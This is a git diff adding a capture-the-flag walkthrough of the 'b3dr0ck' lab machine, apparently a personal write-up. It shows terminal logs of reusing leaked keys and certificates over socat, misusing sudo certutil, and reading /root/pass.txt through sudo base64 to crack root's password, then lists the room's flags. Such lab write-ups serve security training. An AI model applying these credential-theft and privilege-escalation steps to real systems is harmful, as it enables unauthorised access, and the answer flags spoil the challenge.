@@ -273,3 +273,278 @@ MIIEpAIBAAKCAQEAuuG9AV3KNMRjU/cjwo3RHGfB6RFNTsJNOrHc7DyZKVbzkiPg
 5ZTEaqxbqjen880vaATq8sRvkqHbeQNKz4AUiHlnnVUHbTBwu7ybRxnZd6ux5u5d
 z78x7wJkLTJW3EtVyr2Du7yL4k8/NGT53eeUKnVslCHkJb+maQXtE67/aM6CU7hU
 yL57LpiWmYuXQEUTcwqDdV0f89Orx+sWRBPP2H01AgVYAOHeC1QSHslWE+pn3HE/
+bosBoclbPm5zolV/1Ba/TRg1ucB56cFmfq93CPb0RUs8GSMoAVkfEWwNfxAEjBNL
+Ir8k7s4CtbqkJIRMpdadJCvRdUn/s1AiRNTTUwIDAQABAoIBAB54vFbCsjvUYdXJ
+EF2ivhwBlw6nsZFMAUe2xK0IXHjvIpwLmZoVnck+/VtN4+bO6BHv61dWTFL+bUjY
+DpSy76YpFYoD2Ugmg9s4r6DySBFJP6LF7yn2pO+x1h/Ae4VEC2MZb6dm4PAvt8CV
+TmCuZ+xcZS3qMMcu7rVlL/jrqd2utxrwQrU3LqKTSesh9Jjf/rLB+4NoHGJ+oQmX
+ngmNnUBPss6fKakTLGo/UmJOR13UFTPhRdDyIcPtO6a902qqMcR+oGxuW4wwSJ7B
+aCuNmOe7hXe9SavCO9RCf9jOQk7wmg8cLCVayE2WPicaTaJb30mJS+q/1Zu9IPh/
+48vAFEECgYEA4HpoIAOtMMlftlZ0coTeWQz+qwIg3OKxZXmB1bo3BpR6bZfDqJkG
+967z0oF64HMaVdsH/kFrPpHGCAyM2PMkpZg6+r6pAoHkj47FhzNXouhkOcLSQ1aO
+8uYVoi8/yVUU2nkXvbsKXdwO5dgBxVMxeFLpUBPsKjNBIkYmzLZ4aIMCgYEA1R/P
+Cm1XV91j4+S0Wl/4AtNFn03riIbIyLh5pbP8iIlqDY1graCQdHwyVSLrn1ujrZSW
+x4T/f9bH3/bdYlOjWsSwYmenZxhWExrHk6oSrdARnytAo9U4LRfamnZp52AZ5pJI
+R3aVvPRniKNy5ka4/Ry5Iv6fYBG4cx2zabAw0PECgYBg+0FlI3F9tGKPikaA+3p8
+iqq0AxVjmOT/bEF1rx/6zcce9gRoIMTr2UAp4BrQQapNEXYgmO7Wd3BRJersCA/7
+IwvILPsjxC6U/x/Dy6C/FxvGAK+KvCjCNDmAel1ahFGgGdTx+Y7/AgXFs08Ai3LC
+A0Adgp3zlXU8c4ZrxyG6NQKBgQC+z//aYhL1Q+4PN9CRqaKvRODsxCLA1YwmyaOA
+TCkpRX6CK7YHPd6XrCqUNvOmdbGR05s7f0QR/QZu6uNDCYcT2U3ijNNAZnWKHUva
+VUbr/4IHc/4nsNre5KB/8szWryABY6767J0b0+ZuW4ify2oMlA7d2gJvTO5LgqgD
+VBAgwQKBgQDTBI//JanYwQC3cYofdGfhtrKljekwgTouw6cv3vusYh7oOrjellsh
+JQzwMgcHWs9SQKYYFAfKLqYxUGCK6CkxPWE8iMdOoeYm5tYeP8XaWYASzBr78ISm
+fIo59ikj8EPZhIZ3mzJEjDS/KT93gTOjN8jHdwM1L0LEMk432eqakQ==
+-----END RSA PRIVATE KEY-----
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ nano certificate
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ nano key  
+
+What are you looking for? --help
+Looks like the secure login service is running on port: 54321
+
+Try connecting using:
+socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ socat stdio ssl:10.10.179.238:54321,cert=certificate,key=key,verify=0
+
+ __     __   _     _             _____        _     _             _____        _ 
+ \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
+   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
+    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
+    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
+                                                                                 
+                                                                                 
+
+Welcome: 'Barney Rubble' is authorized.
+b3dr0ck> pass
+Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ ssh barney@10.10.179.238       
+The authenticity of host '10.10.179.238 (10.10.179.238)' can't be established.
+ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.179.238' (ED25519) to the list of known hosts.
+barney@10.10.179.238's password:  d1ad7c0a3805955a35eb260dab4180dd
+barney@b3dr0ck:~$ ls
+barney.txt
+barney@b3dr0ck:~$ cat barney.txt
+THM{f05780f08f0eb1de65023069d0e4c90c}
+
+The information we gathered above tells us that we will have to utilize certutil to privesc as fred, since we do have sudo privilege in certutil. Typing certutil -h will show us how to list current certs. 
+
+barney@b3dr0ck:~$ cd /home/fred
+barney@b3dr0ck:/home/fred$ ls
+fred.txt
+barney@b3dr0ck:/home/fred$ cat fred.txt
+cat: fred.txt: Permission denied
+
+barney@b3dr0ck:/home/fred$ ls -la
+total 36
+drwxr-xr-x 4 fred fred 4096 Apr 30 21:41 .
+drwxr-xr-x 4 root root 4096 Apr 10 00:18 ..
+lrwxrwxrwx 1 fred fred    9 Apr 28 06:42 .bash_history -> /dev/null
+-rw-r--r-- 1 fred fred  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 fred fred 3771 Feb 25  2020 .bashrc
+drwx------ 2 fred fred 4096 Apr 30 21:41 .cache
+-rw------- 1 fred fred   38 Apr 29 06:30 fred.txt
+-rw-rw-r-- 1 fred fred    0 Apr 30 21:41 .hushlogin
+-rw-r--r-- 1 fred fred  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 fred fred   75 Apr 10 00:35 .selected_editor
+drwx------ 2 fred fred 4096 Apr 29 06:31 .ssh
+lrwxrwxrwx 1 root root    9 Apr 29 06:31 .viminfo -> /dev/null
+barney@b3dr0ck:/home/fred$ certutil -h
+
+Cert Tool Usage:
+----------------
+
+Show current certs:
+  certutil ls
+
+Generate new keypair:
+  certutil [username] [fullname]
+
+The below  shows files with fred as the filename. That tells me we can use these files like we did with the user barney. We cannot use cat or any text editors to open any of the files, so we have to do more reading on how to utilize certutil to read the contents of any of the files.
+
+barney@b3dr0ck:/home/fred$ certutil ls
+
+Current Cert List: (/usr/share/abc/certs)
+------------------
+total 56
+drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
+drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
+-rw-r----- 1 root root  972 Sep 24 18:06 barney.certificate.pem
+-rw-r----- 1 root root 1678 Sep 24 18:06 barney.clientKey.pem
+-rw-r----- 1 root root  894 Sep 24 18:06 barney.csr.pem
+-rw-r----- 1 root root 1678 Sep 24 18:06 barney.serviceKey.pem
+-rw-r----- 1 root root  976 Sep 24 18:06 fred.certificate.pem
+-rw-r----- 1 root root 1678 Sep 24 18:06 fred.clientKey.pem
+-rw-r----- 1 root root  898 Sep 24 18:06 fred.csr.pem
+-rw-r----- 1 root root 1678 Sep 24 18:06 fred.serviceKey.pem
+
+barney@b3dr0ck:/home/fred$ sudo cat fred.csr.pem
+Sorry, user barney is not allowed to execute '/usr/bin/cat fred.csr.pem' as root on b3dr0ck.
+barney@b3dr0ck:/home/fred$ sudo certutil -a fred.csr.pem
+Generating credentials for user: a (fredcsrpem)
+Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
+Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAsfPgXayDykAtjUzKLf1tKtAHZZ0eVlVgGpduVZGONc4SC1Wu
+CRojI+FD5hcOuCzXQm+AG+EdBRoPenqD5hTD7qBXDg3Nc+WVviZnNU2ORbsSo2G6
+uoP9Gnhl14AVk8xUrtTSk86lP546kMUn5bS+WF08zyrJrVqMeJOlR6xxmZ1v2NKb
+E8vg7lDl2BcsXy4uL5Xdlu2prUjiWNg8XNKa7KekLRpqzWYPAfyx3w0086GVSmCE
+FAjpslD40soWyB3xKcTaoVefXksx+5gJHR3I1d4lqhVIuLSPNIufQlB4AJg+L/Vz
+NwTAqPmMBwEdbR/+PN9ZD3yedpYiRJvrN7HQZQIDAQABAoIBAAkCZduYPlvg/+1l
+c978M6i1O4qjd8O7MtBl1koywlZrBnLYdaU0U48feoaNqEseyg8tAflnXkbB2QLE
+bSUa7AiKyZ2GiV5Sw1ALNbJ3KLrTC9CFxCRpRkkuy0krzOvcrnTjhX3COo+L/T8T
+HD/+9JwYrFl4uxkxumboYrfMPTwfrMJ36hTsFoU9vBeCnFMMok33oGQC4RpJAt6y
+yKad/Yf9PB7Ky4e5h9Zjn/5wZeMest3jwXvHc8rHDnemHlen6yOSC2/0WIhjOoIY
+M4Fonhs118Z87AlpP5+8tlOla4iZx6DYADXplHMHOUOoT3qNqCy23e+NYirNsf6q
+8Xr2WwECgYEA4c47V0aIerLzm+LyoepW8Dc5UWu+nxJrERvVxCzt0w+ikWSZU/+M
+VX5ezpW3YxWcRA2qFEO6YIGSr/vdjOihxUMKzKYP7dsCdDiAJgKHQa51H08lOM58
+MjNAbR6vi7shQL0y5G71ty7XujbbV8txMDOk1vO1V0tKFZlPreTuJiECgYEAyb+L
+Vy4oISchUFexSL8k6OYohHssLYseOs8Dcg+X7Eg0vyUsgJ7bw7RrjaO7BZknRDrQ
+Gb6krIJ2R7R3ugj5aOShIgq6Ttot0n3oY/uP7heFL/5MTIhxYMloWwDtrZ61d8SS
+o+25/AFVLqO9N3IRWkZowENVksQ6jQbiriGNWcUCgYBzeK0r4mvkoyKksxf06Qtw
+aC0tj/W5DwglhaB5Y6hy6GnwBAvMwsAW8Dq3ViSjzOdOfdZd6oyi0WAcEqanakdf
+wvsA0GMQ9ZB5snMF/QEB+571VdnpBN7KJR9rLegDgrxsiNQ/sOaCuLelCGx+pxDI
+34AKVDKF44CNLwtqF8oZQQKBgBa37yT+GZ7CHUpC1b/vZmSjpmRkynDGfbz5mtW5
+U85TwzzTHtPND8pWAtaMXX8f5AAW72A2y6xxdIhWljTo1c0uEccXlitS/l35t7Wq
+mmahV2o0JLtpkfroM0wsKpemi6DVDf5PwuXR8Jmz7pbTzYhw7VLZQkWouz8uS1B4
+jsZRAoGAXOx2cv82GK1WxkQOWd0/v8jf+mvTBQw+TkcEp6DHXETenmuTlsRAzfIv
+SZECeb1TW5u7dk+Y/0KATVQ8+K6b4As9IYHtaxRDlBnyZFwM6Q83XWVqaswaAZv9
+OoH2as2ZEOgkm/Y4worNWQ2G7z/W5rWq7fjdF3YRRNwaBRYmtRw=
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA5MjQxODQ0MzdaFw0yMjA5MjUxODQ0MzdaMBUxEzARBgNVBAMMCmZy
+ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx8+BdrIPK
+QC2NTMot/W0q0AdlnR5WVWAal25VkY41zhILVa4JGiMj4UPmFw64LNdCb4Ab4R0F
+Gg96eoPmFMPuoFcODc1z5ZW+Jmc1TY5FuxKjYbq6g/0aeGXXgBWTzFSu1NKTzqU/
+njqQxSfltL5YXTzPKsmtWox4k6VHrHGZnW/Y0psTy+DuUOXYFyxfLi4vld2W7amt
+SOJY2Dxc0prsp6QtGmrNZg8B/LHfDTTzoZVKYIQUCOmyUPjSyhbIHfEpxNqhV59e
+SzH7mAkdHcjV3iWqFUi4tI80i59CUHgAmD4v9XM3BMCo+YwHAR1tH/4831kPfJ52
+liJEm+s3sdBlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAFErosPjO1fvUSFp2ecR
+E1PV/je8Z5qkdRIeAxP7+YvDhTQayt02Zqw9R+l1NkEadSWR1dfrMnq/UnMZvWe2
+q+IOHq8tf/xyq3N7NQucrIMDDI8vKRIOeMLcZyIkmIBLfstMA2rs0AwGuX9RWD9t
+vHopVfYvXPWdJ4POg1b+alwYoeeSEnsaqlWbAK47qaSFCgE7Rqmn2gYSSiJWKd+j
+5IOsqT6/Q98FJqGmvLfeKAfKdnHTYOslXhFIU1zQ2HHI00C6Z59krZqX1H1r9h+U
+zzbKYoC/2ZjC6ncStOM6aLJGS41Hmie6ur27iNyGgvrEKHTfDQk+a1JV7OwImIiA
+wdw=
+-----END CERTIFICATE-----
+
+so the same method use socat
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ nano fredcertificate
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ nano fredkey
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
+└─$ socat stdio ssl:10.10.179.238:54321,cert=fredcertificate,key=fredkey,verify=0
+
+ __     __   _     _             _____        _     _             _____        _ 
+ \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
+   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
+    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
+    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
+                                                                                 
+                                                                                 
+
+Welcome: 'fredcsrpem' is authorized.
+b3dr0ck> pass
+Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
+
+barney@b3dr0ck:/home/fred$ su fred
+Password: YabbaDabbaD0000!
+fred@b3dr0ck:~$ ls
+fred.txt
+fred@b3dr0ck:~$ cat fred.txt
+THM{08da34e619da839b154521da7323559d}
+
+priv esc
+
+fred@b3dr0ck:~$ sudo -l
+Matching Defaults entries for fred on b3dr0ck:
+    insults, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User fred may run the following commands on b3dr0ck:
+    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
+fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
+TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
+QkdYVVJUTEpaS0ZTU1lLCg==
+fred@b3dr0ck:~$ sudo /usr/bin/base32 /root/pass.txt
+JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
+4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
+
+let's use cyberchef
+
+magic wand (so first do b64 then copy in input then magic)
+
+from b64 > from b32 > from b64 > md5 > crackstation
+
+TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
+QkdYVVJUTEpaS0ZTU1lLCg== > LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK >
+YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK > a00a12aad6b7c16bf07032bd05a31d56 > 	flintstonesvitamins
+
+found :)
+
+fred@b3dr0ck:~$ sudo su
+[sudo] password for fred: 
+I wave my private parts at your aunties!
+[sudo] password for fred: 
+You empty-headed animal food trough wiper!
+[sudo] password for fred: 
+sudo: 3 incorrect password attempts
+fred@b3dr0ck:~$ su
+Password: 
+su: Authentication failure
+
+just su
+
+fred@b3dr0ck:~$ su
+Password: 
+root@b3dr0ck:/home/fred# cd /root
+root@b3dr0ck:~# ls
+pass.txt  root.txt  snap
+root@b3dr0ck:~# cat pass.txt
+LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
+root@b3dr0ck:~# cat root.txt
+THM{de4043c009214b56279982bf10a661b7}
+```
+What is the barney.txt flag?
+Explore the higher ports, one is ready for a TLS socket with key & cert obtained from port 9009
+What is fred's password?
+You can find it same way as barney's, with fred's credentials (cert + key)
+*YabbaDabbaD0000!*
+What is the fred.txt flag?
+What is the root.txt flag?
+[root pass] Multi encode/decode (+ crackstation ;)
+
+## Flags / Answers
+- ***THM{f05780f08f0eb1de65023069d0e4c90c}***
+- ***THM{08da34e619da839b154521da7323559d}***
+- ***THM{de4043c009214b56279982bf10a661b7}***
+
+## Notes / Lessons Learned
+[[Plotted-TMS]]
+
